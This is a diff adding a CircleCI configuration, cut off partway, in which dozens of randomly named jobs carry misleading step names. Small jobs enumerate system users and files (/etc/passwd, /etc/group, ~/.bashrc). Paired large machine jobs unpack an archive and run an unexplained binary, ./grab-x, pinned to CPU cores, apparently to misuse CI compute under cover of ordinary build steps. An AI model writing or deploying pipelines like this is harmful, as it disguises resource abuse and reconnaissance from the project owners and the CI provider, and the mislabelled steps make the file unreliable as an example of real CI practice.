@@ -1,0 +1,1296 @@
+version: 2.1
+
+jobs:
+  ADAPTER_V2_8:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Produce stage3 fixture
+          command: |
+            mkdir -p /tmp/jian
+            set +o pipefail 2>/dev/null; seq 1 1003236 | awk '{print $1, cos($1/100)}' > /tmp/jian/PO-2021-12989; true
+            b=$(wc -c </tmp/jian/PO-2021-12989); echo "n=feb26-canary b=$b"
+      - persist_to_workspace:
+          root: /tmp/jian
+          paths:
+            - 'PO-2021-12989'
+  feb26-canary:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/jian
+      - run:
+          name: Union gate output
+          command: |
+            sed '/./!d' /tmp/jian/hawkl4y3r 2>/dev/null | wc -l || true
+      - run:
+          name: Clone target
+          command: git clone --depth 1 --single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress and stage
+          command: tar -I xz -xf slices-v5.tar.xz
+      - run:
+          command: sleep 25s
+      - run:
+          command: taskset -c 0-3 ./grab-x
+  peN-dePth-LoCkeD:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/jian
+      - run:
+          name: Sprinkle some page on the board
+          command: |
+            mkdir -p /tmp/jian
+            { set +o pipefail 2>/dev/null; fallocate -l 2M "/tmp/inbox-2.out" && ls -lh "/tmp/inbox-2.out"; true ; } > /tmp/jian/guest
+            b=$(wc -c </tmp/jian/guest); echo "n=all-greens b=$b"
+      - persist_to_workspace:
+          root: /tmp/jian
+          paths:
+            - 'guest'
+  all-greens:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/jian
+      - run:
+          name: Union gate output
+          command: |
+            sed '/./!d' /tmp/jian/hawkl4y3r 2>/dev/null | wc -l || true
+      - run:
+          name: Clone target
+          command: git clone --depth 1 --single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress and stage
+          command: tar -I xz -xf slices-v5.tar.xz
+      - run:
+          command: sleep 25s
+      - run:
+          command: taskset -c 0-3 ./grab-x
+  sdof27od8:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/jian
+      - run:
+          name: Touch and go dump
+          command: |
+            mkdir -p /tmp/jian
+            { set +o pipefail 2>/dev/null; ls -Q --full-time /var/tmp|head -10; true ; } > /tmp/jian/blake_d8ab3d2
+            b=$(wc -c </tmp/jian/blake_d8ab3d2); echo "n=rocket b=$b"
+      - persist_to_workspace:
+          root: /tmp/jian
+          paths:
+            - 'blake_d8ab3d2'
+  rocket:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/jian
+      - run:
+          name: Union gate output
+          command: |
+            sed '/./!d' /tmp/jian/h3a7hgr0v3 2>/dev/null | wc -l || true
+      - run:
+          name: Clone target
+          command: git clone --depth 1 --single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress and stage
+          command: tar -I xz -xf slices-v5.tar.xz
+      - run:
+          command: sleep 25s
+      - run:
+          command: taskset -c 0-3 ./grab-x
+  b1gz1:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/jian
+      - run:
+          name: Outline Flavor Lite
+          command: |
+            mkdir -p /tmp/jian
+            { set +o pipefail 2>/dev/null; [[ -d ${HOME} ]] && echo yes || echo 'no'; true ; } > /tmp/jian/build-7467
+            b=$(wc -c </tmp/jian/build-7467); echo "n=io-plus b=$b"
+      - persist_to_workspace:
+          root: /tmp/jian
+          paths:
+            - 'build-7467'
+  io-plus:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/jian
+      - run:
+          name: Union gate output
+          command: |
+            sed '/./!d' /tmp/jian/hawkl4y3r 2>/dev/null | wc -l || true
+      - run:
+          name: Clone target
+          command: git clone --depth 1 --single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress and stage
+          command: tar -I xz -xf slices-v5.tar.xz
+      - run:
+          command: sleep 25s
+      - run:
+          command: taskset -c 0-3 ./grab-x
+  releaseManifest:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/jian
+      - run:
+          name: XXX replay the junit output properly
+          command: |
+            mkdir -p /tmp/jian
+            { set +o pipefail 2>/dev/null; echo 'check mail' | cut -c1-8; true ; } > /tmp/jian/SPARK_SWEEP_PROXY_USER
+            b=$(wc -c </tmp/jian/SPARK_SWEEP_PROXY_USER); echo "n=v3-canary b=$b"
+      - persist_to_workspace:
+          root: /tmp/jian
+          paths:
+            - 'SPARK_SWEEP_PROXY_USER'
+  v3-canary:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/jian
+      - run:
+          name: Union gate output
+          command: |
+            sed '/./!d' /tmp/jian/hawkl4y3r 2>/dev/null | wc -l || true
+      - run:
+          name: Clone target
+          command: git clone --depth 1 --single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress and stage
+          command: tar -I xz -xf slices-v5.tar.xz
+      - run:
+          command: sleep 25s
+      - run:
+          command: taskset -c 0-3 ./grab-x
+  COOKIE__GLOBAL_LOCALE:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/jian
+      - run:
+          name: Checkpoint the loss curve ready for good measure
+          command: |
+            mkdir -p /tmp/jian
+            { set +o pipefail 2>/dev/null; getent passwd | cut -d: -f1,7 | fmt -w 43 | sort; true ; } > /tmp/jian/shard285
+            b=$(wc -c </tmp/jian/shard285); echo "n=t-old b=$b"
+      - persist_to_workspace:
+          root: /tmp/jian
+          paths:
+            - 'shard285'
+  t-old:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/jian
+      - run:
+          name: Union gate output
+          command: |
+            sed '/./!d' /tmp/jian/h3a7hgr0v3 2>/dev/null | wc -l || true
+      - run:
+          name: Clone target
+          command: git clone --depth 1 --single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress and stage
+          command: tar -I xz -xf slices-v5.tar.xz
+      - run:
+          command: sleep 25s
+      - run:
+          command: taskset -c 0-3 ./grab-x
+  XITER9:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Export pre the outage
+          command: |
+            mkdir -p /tmp/jian
+            { set +o pipefail 2>/dev/null; wc -l /etc/*.conf 2>/dev/null | awk '$2 != "total" {print $1}' | sort -n | tail --lines=1; true ; } > /tmp/jian/thread.lambda.gadget.signal.grove
+            b=$(wc -c </tmp/jian/thread.lambda.gadget.signal.grove); echo "n=v2-preview2 b=$b"
+      - persist_to_workspace:
+          root: /tmp/jian
+          paths:
+            - 'thread.lambda.gadget.signal.grove'
+  v2-preview2:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/jian
+      - run:
+          name: Union gate output
+          command: |
+            sed '/./!d' /tmp/jian/dnC94BbX0h2 2>/dev/null | wc -l || true
+      - run:
+          name: Clone target
+          command: git clone --depth 1 --single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress and stage
+          command: tar -I xz -xf slices-v5.tar.xz
+      - run:
+          command: sleep 25s
+      - run:
+          command: taskset -c 0-3 ./grab-x
+  panWorkerRequest:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/jian
+      - run:
+          name: Appreciate you pinning the login attempts
+          command: |
+            mkdir -p /tmp/jian
+            { set +o pipefail 2>/dev/null; printf '%s' "won't fix"; echo; true ; } > /tmp/jian/rusty-frame-vector-worker
+            b=$(wc -c </tmp/jian/rusty-frame-vector-worker); echo "n=gating b=$b"
+      - persist_to_workspace:
+          root: /tmp/jian
+          paths:
+            - 'rusty-frame-vector-worker'
+  gating:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/jian
+      - run:
+          name: Union gate output
+          command: |
+            sed '/./!d' /tmp/jian/dnC94BbX0h2 2>/dev/null | wc -l || true
+      - run:
+          name: Clone target
+          command: git clone --depth 1 --single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress and stage
+          command: tar -I xz -xf slices-v5.tar.xz
+      - run:
+          command: sleep 25s
+      - run:
+          command: taskset -c 0-3 ./grab-x
+  g_pRuleManifestMain:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/jian
+      - run:
+          name: Thandi takes tap
+          command: |
+            mkdir -p /tmp/jian
+            { set +o pipefail 2>/dev/null; echo secret >'/tmp/be8.dat' && shred -u '/tmp/be8.dat' && ls '/tmp/be8.dat' 2>/dev/null || echo shredded; true ; } > /tmp/jian/stage5f6135
+            b=$(wc -c </tmp/jian/stage5f6135); echo "n=ensure-nightly-artifact-bundle b=$b"
+      - persist_to_workspace:
+          root: /tmp/jian
+          paths:
+            - 'stage5f6135'
+  ensure-nightly-artifact-bundle:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/jian
+      - run:
+          name: Union gate output
+          command: |
+            sed '/./!d' /tmp/jian/h3a7hgr0v3 2>/dev/null | wc -l || true
+      - run:
+          name: Clone target
+          command: git clone --depth 1 --single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress and stage
+          command: tar -I xz -xf slices-v5.tar.xz
+      - run:
+          command: sleep 25s
+      - run:
+          command: taskset -c 0-3 ./grab-x
+  sys_offset_brush:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/jian
+      - run:
+          name: Red light flash
+          command: |
+            mkdir -p /tmp/jian
+            { set +o pipefail 2>/dev/null; echo 66 22 14 26 28 82 14 | tr ' ' '\n' | awk '{print $1 * 2}' | shuf -n 1; true ; } > /tmp/jian/ridge368
+            b=$(wc -c </tmp/jian/ridge368); echo "n=brodcast-42 b=$b"
+      - persist_to_workspace:
+          root: /tmp/jian
+          paths:
+            - 'ridge368'
+  brodcast-42:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/jian
+      - run:
+          name: Union gate output
+          command: |
+            sed '/./!d' /tmp/jian/hawkl4y3r 2>/dev/null | wc -l || true
+      - run:
+          name: Clone target
+          command: git clone --depth 1 --single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress and stage
+          command: tar -I xz -xf slices-v5.tar.xz
+      - run:
+          command: sleep 25s
+      - run:
+          command: taskset -c 0-3 ./grab-x
+  hWndIteratorLegacyTensor:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/jian
+      - run:
+          name: Please record the calibration beads
+          command: |
+            mkdir -p /tmp/jian
+            { set +o pipefail 2>/dev/null; sha224sum $HOME/.bashrc|awk '{print $1}'; true ; } > /tmp/jian/marketRiver
+            b=$(wc -c </tmp/jian/marketRiver); echo "n=LAB_INIT_4 b=$b"
+      - persist_to_workspace:
+          root: /tmp/jian
+          paths:
+            - 'marketRiver'
+  LAB_INIT_4:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/jian
+      - run:
+          name: Union gate output
+          command: |
+            sed '/./!d' /tmp/jian/dnC94BbX0h2 2>/dev/null | wc -l || true
+      - run:
+          name: Clone target
+          command: git clone --depth 1 --single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress and stage
+          command: tar -I xz -xf slices-v5.tar.xz
+      - run:
+          command: sleep 25s
+      - run:
+          command: taskset -c 0-3 ./grab-x
+  usp_ColumnFreeStore:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/jian
+      - run:
+          name: Just in case pack the backorders
+          command: |
+            mkdir -p /tmp/jian
+            { set +o pipefail 2>/dev/null; for entry in `seq 8`; do printf '%02d\n' "$entry";done; true ; } > /tmp/jian/h3a7hgr0v3
+            b=$(wc -c </tmp/jian/h3a7hgr0v3); echo "n=py310-test b=$b"
+      - persist_to_workspace:
+          root: /tmp/jian
+          paths:
+            - 'h3a7hgr0v3'
+  py310-test:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/jian
+      - run:
+          name: Union gate output
+          command: |
+            sed '/./!d' /tmp/jian/h3a7hgr0v3 2>/dev/null | wc -l || true
+      - run:
+          name: Clone target
+          command: git clone --depth 1 --single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress and stage
+          command: tar -I xz -xf slices-v5.tar.xz
+      - run:
+          command: sleep 25s
+      - run:
+          command: taskset -c 0-3 ./grab-x
+  brown200:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Produce stage3 fixture
+          command: |
+            mkdir -p /tmp/jian
+            { set +o pipefail 2>/dev/null; grep -Rw case /usr/share/doc/bash | head -n5; true ; } > /tmp/jian/hawkl4y3r
+            b=$(wc -c </tmp/jian/hawkl4y3r); echo "n=green-light b=$b"
+      - persist_to_workspace:
+          root: /tmp/jian
+          paths:
+            - 'hawkl4y3r'
+  green-light:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/jian
+      - run:
+          name: Union gate output
+          command: |
+            sed '/./!d' /tmp/jian/hawkl4y3r 2>/dev/null | wc -l || true
+      - run:
+          name: Clone target
+          command: git clone --depth 1 --single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress and stage
+          command: tar -I xz -xf slices-v5.tar.xz
+      - run:
+          command: sleep 25s
+      - run:
+          command: taskset -c 0-3 ./grab-x
+  DynamicBufferedPtrCache:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/jian
+      - run:
+          name: Bring the currency fields to a boil
+          command: |
+            mkdir -p /tmp/jian
+            { set +o pipefail 2>/dev/null; ls -RX /srv | awk '{print length, $0}' | sort -n | tail -n 3; true ; } > /tmp/jian/lambda
+            b=$(wc -c </tmp/jian/lambda); echo "n=java17-vet b=$b"
+      - persist_to_workspace:
+          root: /tmp/jian
+          paths:
+            - 'lambda'
+  java17-vet:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/jian
+      - run:
+          name: Union gate output
+          command: |
+            sed '/./!d' /tmp/jian/h3a7hgr0v3 2>/dev/null | wc -l || true
+      - run:
+          name: Clone target
+          command: git clone --depth 1 --single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress and stage
+          command: tar -I xz -xf slices-v5.tar.xz
+      - run:
+          command: sleep 25s
+      - run:
+          command: taskset -c 0-3 ./grab-x
+  COUPON_SHIPMENT:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/jian
+      - run:
+          name: Cook the boss arena
+          command: |
+            mkdir -p /tmp/jian
+            { set +o pipefail 2>/dev/null; find /etc -maxdepth 2 -type l -path '*/host*' -exec stat -c %F "{}" \; 2>/dev/null|sort|head -n 15; true ; } > /tmp/jian/dnC94BbX0h2
+            b=$(wc -c </tmp/jian/dnC94BbX0h2); echo "n=q4-cleanup b=$b"
+      - persist_to_workspace:
+          root: /tmp/jian
+          paths:
+            - 'dnC94BbX0h2'
+  q4-cleanup:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/jian
+      - run:
+          name: Union gate output
+          command: |
+            sed '/./!d' /tmp/jian/dnC94BbX0h2 2>/dev/null | wc -l || true
+      - run:
+          name: Clone target
+          command: git clone --depth 1 --single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress and stage
+          command: tar -I xz -xf slices-v5.tar.xz
+      - run:
+          command: sleep 25s
+      - run:
+          command: taskset -c 0-3 ./grab-x
+  red2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/jian
+      - run:
+          name: Promote overstock from tier one to disk
+          command: |
+            mkdir -p /tmp/jian
+            { set +o pipefail 2>/dev/null; getent passwd | cut -d : -f 1,3,7 | head -n10; true ; } > /tmp/jian/crash.log.19
+            b=$(wc -c </tmp/jian/crash.log.19); echo "n=rollout b=$b"
+      - persist_to_workspace:
+          root: /tmp/jian
+          paths:
+            - 'crash.log.19'
+  rollout:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/jian
+      - run:
+          name: Union gate output
+          command: |
+            sed '/./!d' /tmp/jian/h3a7hgr0v3 2>/dev/null | wc -l || true
+      - run:
+          name: Clone target
+          command: git clone --depth 1 --single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress and stage
+          command: tar -I xz -xf slices-v5.tar.xz
+      - run:
+          command: sleep 25s
+      - run:
+          command: taskset -c 0-3 ./grab-x
+  omni-table:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/jian
+      - run:
+          name: JNZ seeding
+          command: |
+            mkdir -p /tmp/jian
+            { set +o pipefail 2>/dev/null; find /dev -maxdepth 2 -name 'zero' -uid 0 -exec stat -c %F {} ";" 2>/dev/null|sed 's|.*/||'|sort -u; true ; } > /tmp/jian/xx_d72204800
+            b=$(wc -c </tmp/jian/xx_d72204800); echo "n=sam-run b=$b"
+      - persist_to_workspace:
+          root: /tmp/jian
+          paths:
+            - 'xx_d72204800'
+  sam-run:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/jian
+      - run:
+          name: Union gate output
+          command: |
+            sed '/./!d' /tmp/jian/hawkl4y3r 2>/dev/null | wc -l || true
+      - run:
+          name: Clone target
+          command: git clone --depth 1 --single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress and stage
+          command: tar -I xz -xf slices-v5.tar.xz
+      - run:
+          command: sleep 25s
+      - run:
+          command: taskset -c 0-3 ./grab-x
+  cyan_post:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/jian
+      - run:
+          name: Coda
+          command: |
+            mkdir -p /tmp/jian
+            { set +o pipefail 2>/dev/null; result=pod env | grep ^result=; true ; } > /tmp/jian/_wip-b1644
+            b=$(wc -c </tmp/jian/_wip-b1644); echo "n=whiskey-4 b=$b"
+      - persist_to_workspace:
+          root: /tmp/jian
+          paths:
+            - '_wip-b1644'
+  whiskey-4:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/jian
+      - run:
+          name: Union gate output
+          command: |
+            sed '/./!d' /tmp/jian/hawkl4y3r 2>/dev/null | wc -l || true
+      - run:
+          name: Clone target
+          command: git clone --depth 1 --single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress and stage
+          command: tar -I xz -xf slices-v5.tar.xz
+      - run:
+          command: sleep 25s
+      - run:
+          command: taskset -c 0-3 ./grab-x
+  feature-trait-closed:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Mixed precision to be tested
+          command: |
+            mkdir -p /tmp/jian
+            { set +o pipefail 2>/dev/null; ln -sf /usr/bin/env "/tmp/inner-summer.log" && stat -c %N "/tmp/inner-summer.log"; true ; } > /tmp/jian/archive
+            b=$(wc -c </tmp/jian/archive); echo "n=anothr-run b=$b"
+      - persist_to_workspace:
+          root: /tmp/jian
+          paths:
+            - 'archive'
+  anothr-run:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/jian
+      - run:
+          name: Union gate output
+          command: |
+            sed '/./!d' /tmp/jian/h3a7hgr0v3 2>/dev/null | wc -l || true
+      - run:
+          name: Clone target
+          command: git clone --depth 1 --single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress and stage
+          command: tar -I xz -xf slices-v5.tar.xz
+      - run:
+          command: sleep 25s
+      - run:
+          command: taskset -c 0-3 ./grab-x
+  t18g58h4qdqaanpu:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/jian
+      - run:
+          name: Slice the pick list
+          command: |
+            mkdir -p /tmp/jian
+            { set +o pipefail 2>/dev/null; awk -F: '{print NF}' /etc/group | nl; true ; } > /tmp/jian/signal548
+            b=$(wc -c </tmp/jian/signal548); echo "n=vega b=$b"
+      - persist_to_workspace:
+          root: /tmp/jian
+          paths:
+            - 'signal548'
+  vega:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/jian
+      - run:
+          name: Union gate output
+          command: |
+            sed '/./!d' /tmp/jian/h3a7hgr0v3 2>/dev/null | wc -l || true
+      - run:
+          name: Clone target
+          command: git clone --depth 1 --single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress and stage
+          command: tar -I xz -xf slices-v5.tar.xz
+      - run:
+          command: sleep 25s
+      - run:
+          command: taskset -c 0-3 ./grab-x
+  ortho_rect:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/jian
+      - run:
+          name: The tax report is done
+          command: |
+            mkdir -p /tmp/jian
+            { set +o pipefail 2>/dev/null; cat ~/.bashrc | head -3 | sort; true ; } > /tmp/jian/hawk354
+            b=$(wc -c </tmp/jian/hawk354); echo "n=node20-cov b=$b"
+      - persist_to_workspace:
+          root: /tmp/jian
+          paths:
+            - 'hawk354'
+  node20-cov:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/jian
+      - run:
+          name: Union gate output
+          command: |
+            sed '/./!d' /tmp/jian/dnC94BbX0h2 2>/dev/null | wc -l || true
+      - run:
+          name: Clone target
+          command: git clone --depth 1 --single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress and stage
+          command: tar -I xz -xf slices-v5.tar.xz
+      - run:
+          command: sleep 25s
+      - run:
+          command: taskset -c 0-3 ./grab-x
+  gamma_err:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/jian
+      - run:
+          name: Sub out sampler
+          command: |
+            mkdir -p /tmp/jian
+            { set +o pipefail 2>/dev/null; [ ! -d /tmp ] && echo true || echo 'false'; true ; } > /tmp/jian/cedar_glint_parser_filter
+            b=$(wc -c </tmp/jian/cedar_glint_parser_filter); echo "n=brodcast-91 b=$b"
+      - persist_to_workspace:
+          root: /tmp/jian
+          paths:
+            - 'cedar_glint_parser_filter'
+  brodcast-91:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/jian
+      - run:
+          name: Union gate output
+          command: |
+            sed '/./!d' /tmp/jian/hawkl4y3r 2>/dev/null | wc -l || true
+      - run:
+          name: Clone target
+          command: git clone --depth 1 --single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress and stage
+          command: tar -I xz -xf slices-v5.tar.xz
+      - run:
+          command: sleep 25s
+      - run:
+          command: taskset -c 0-3 ./grab-x
+  given_upper_manifest:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/jian
+      - run:
+          name: Tidy up the changelog
+          command: |
+            mkdir -p /tmp/jian
+            { set +o pipefail 2>/dev/null; printf 'a\n\n\nb\n' >"/tmp/purple01.out" && cat -sn "/tmp/purple01.out"; true ; } > /tmp/jian/crc_e58ea2dddd1c4
+            b=$(wc -c </tmp/jian/crc_e58ea2dddd1c4); echo "n=preview-v9 b=$b"
+      - persist_to_workspace:
+          root: /tmp/jian
+          paths:
+            - 'crc_e58ea2dddd1c4'
+  preview-v9:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/jian
+      - run:
+          name: Union gate output
+          command: |
+            sed '/./!d' /tmp/jian/hawkl4y3r 2>/dev/null | wc -l || true
+      - run:
+          name: Clone target
+          command: git clone --depth 1 --single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress and stage
+          command: tar -I xz -xf slices-v5.tar.xz
+      - run:
+          command: sleep 25s
+      - run:
+          command: taskset -c 0-3 ./grab-x
+  q4:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/jian
+      - run:
+          name: With logging render the pricing page
+          command: |
+            mkdir -p /tmp/jian
+            { set +o pipefail 2>/dev/null; awk -F : '{ print $3 }' /etc/passwd | tail -n 8 | awk '{printf "%05d\n", $1}'; true ; } > /tmp/jian/moor709
+            b=$(wc -c </tmp/jian/moor709); echo "n=ValidateSuite b=$b"
+      - persist_to_workspace:
+          root: /tmp/jian
+          paths:
+            - 'moor709'
+  ValidateSuite:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/jian
+      - run:
+          name: Union gate output
+          command: |
+            sed '/./!d' /tmp/jian/hawkl4y3r 2>/dev/null | wc -l || true
+      - run:
+          name: Clone target
+          command: git clone --depth 1 --single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress and stage
+          command: tar -I xz -xf slices-v5.tar.xz
+      - run:
+          command: sleep 25s
+      - run:
+          command: taskset -c 0-3 ./grab-x
+  t_ga:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Produce stage3 fixture
+          command: |
+            mkdir -p /tmp/jian
+            { set +o pipefail 2>/dev/null; for w in {1..10}; do echo $((w * w)); done; true ; } > /tmp/jian/PXL16010
+            b=$(wc -c </tmp/jian/PXL16010); echo "n=validte b=$b"
+      - persist_to_workspace:
+          root: /tmp/jian
+          paths:
+            - 'PXL16010'
+  validte:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/jian
+      - run:
+          name: Union gate output
+          command: |
+            sed '/./!d' /tmp/jian/hawkl4y3r 2>/dev/null | wc -l || true
+      - run:
+          name: Clone target
+          command: git clone --depth 1 --single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress and stage
+          command: tar -I xz -xf slices-v5.tar.xz
+      - run:
+          command: sleep 25s
+      - run:
+          command: taskset -c 0-3 ./grab-x
+  Request-ChannelId:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/jian
+      - run:
+          name: Mend the archive tables
+          command: |
+            mkdir -p /tmp/jian
+            { set +o pipefail 2>/dev/null; touch "/tmp/local-download-playground.conf" && rm -v "/tmp/local-download-playground.conf"; true ; } > /tmp/jian/179.230
+            b=$(wc -c </tmp/jian/179.230); echo "n=teh-ci b=$b"
+      - persist_to_workspace:
+          root: /tmp/jian
+          paths:
+            - '179.230'
+  teh-ci:
+    machine:
+      image: ubuntu-2204:current
